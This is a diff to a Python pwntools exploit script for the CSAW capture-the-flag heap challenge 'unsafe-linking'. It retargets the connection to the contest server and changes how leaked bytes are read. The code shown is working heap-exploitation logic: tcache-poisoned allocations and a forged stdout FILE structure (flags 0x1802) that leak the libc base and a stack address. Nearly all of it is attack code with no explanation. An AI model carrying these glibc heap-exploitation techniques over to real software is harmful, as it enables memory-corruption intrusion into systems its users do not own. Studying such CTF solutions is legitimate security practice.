@@ -12,15 +12,15 @@
 
 from pwn import *
 from z3 import *
-
+T = 0x2
 context.arch='amd64'
 context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
-
-# p= process("./unsafe-linking")
-p=remote("0.0.0.0",9999)
-sla 	= lambda a,b: 	p.sendlineafter(a,b,timeout=1)
-sa 	    = lambda a,b: 	p.sendafter(a,b,timeout=1)
-
+p = remote("pwn.chal.csaw.io",5000)
+# p= process("./unsafe-linking",env={"LD_PRELOAD":"./libc.so.6"})
+# p=remote("0.0.0.0",9999)
+sla 	= lambda a,b: 	p.sendlineafter(a,b,timeout=T)
+sa 	    = lambda a,b: 	p.sendafter(a,b,timeout=T)
+# gdb.attach(p)
 def cmd(c):
     sla("> ",str(c).encode())
 def add(idx,size,sec = 0, c=b""):
@@ -109,10 +109,12 @@ free(0)
 add(0,0x288,0,tcache(12,heap+0x2a0))
 free(2)
 # 
-
+# context.log_level='debug'
 target = 0x15c0+heap
 add(1,0xd8,0,flat([0x1802,target,target+8,target+8,target,target+8,target+8]))
-base = u64(p.read(8,timeout=1))-0x219ce0
+
+
+base = u64(p.readuntil(b'\xff')[:-1],timeout=T)-0x219ce0
 log.warning("LIBC BASE: "+hex(base))
 free(1)
 
@@ -120,8 +122,8 @@ target = 0x221200+base
 add(1,0x1d8,0,flat([0x1802,target,target+8,target+8,target,target+8,target+8]))
 # context.log_level='debug'
 
-stack = u64(p.read(8,timeout=1))
-
+# p.interactive()
+stack = u64(p.readuntil(b'\xff',timeout=T)[:-1])
 log.warning("STACK ADD: "+hex(stack))
 
 free(1)                                 # One more 0x18
